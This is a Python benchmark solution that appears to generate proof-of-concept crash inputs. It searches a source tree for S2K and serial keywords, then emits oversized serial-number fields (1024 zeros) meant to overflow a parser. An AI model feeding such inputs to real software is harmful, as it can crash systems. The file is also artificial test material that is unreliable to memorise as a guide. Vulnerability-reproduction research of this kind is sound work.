import os
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        def scan_for_s2k(path: str) -> bool:
            keywords = (b"S2K", b"s2k", b"serial", b"Serial", b"serialno", b"card")
            try:
                if tarfile.is_tarfile(path):
                    with tarfile.open(path, "r:*") as tf:
                        for m in tf.getmembers():
                            if not m.isfile():
                                continue
                            name = m.name.lower()
                            if not any(name.endswith(ext) for ext in (".c",".cc",".cpp",".h",".hpp",".txt",".md",".py",".rs",".go",".java",".m",".mm",".sh",".in",".am",".ac")):
                                continue
                            try:
                                f = tf.extractfile(m)
                                if f is None:
                                    continue
                                data = f.read(4096)
                                if any(k in data for k in keywords):
                                    return True
                            except Exception:
                                continue
                    return False
                else:
                    to_scan = []
                    if os.path.isdir(path):
                        for root, dirs, files in os.walk(path):
                            for fn in files:
                                to_scan.append(os.path.join(root, fn))
                    else:
                        to_scan = [path]
                    for p in to_scan:
                        try:
                            name = p.lower()
                            if not any(name.endswith(ext) for ext in (".c",".cc",".cpp",".h",".hpp",".txt",".md",".py",".rs",".go",".java",".m",".mm",".sh",".in",".am",".ac")):
                                continue
                            with open(p, "rb") as f:
                                data = f.read(4096)
                                if any(k in data for k in keywords):
                                    return True
                        except Exception:
                            continue
                    return False
            except Exception:
                return False

        # Prefer minimal PoC if repository hints at S2K/serial parsing
        if scan_for_s2k(src_path):
            return b"S2K:11111111111111111111111"

        # Fallback: broad trigger with multiple likely tokens and long serial
        digits = b"0" * 1024
        lines = [
            b"S2K: " + digits,
            b"s2k: " + digits,
            b"serialno: " + digits,
            b"Serial: " + digits,
            b"serial-no: " + digits,
            b"card-serial: " + digits,
            b"card serial number: " + digits,
            b"cardno: " + digits,
        ]
        return b"\n".join(lines)